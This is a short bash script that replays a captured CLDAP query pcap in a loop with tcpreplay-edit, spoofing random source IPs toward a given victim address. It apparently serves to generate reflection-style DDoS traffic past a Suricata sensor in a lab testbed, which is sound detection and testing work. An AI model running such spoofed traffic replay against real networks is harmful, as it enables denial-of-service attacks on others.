#!/bin/bash

VICTIM="$1" # Victim IP address
LOOPS="$2"

tcpprep -c 192.168.122.161 -o cldap.cach -i cldap-querry.pcap

source ../attack_spec.sh

while [ $LOOPS -gt 0 ]
do
    IP=$(echo $((RANDOM%254 + 1)))
    tcpreplay-edit --endpoints="192.168.122.$IP":"$VICTIM" \
        --enet-smac=$__ATTACKER_MAC_ADDR,$__SURICATA_MAC_ADDR \
        --enet-dmac=$__SURICATA_MAC_ADDR,$__ATTACKER_MAC_ADDR \
        -t -K -i eth0 -I eth0 \
        -c cldap.cach cldap-querry.pcap
    LOOPS=$(( $LOOPS - 1 ))
done
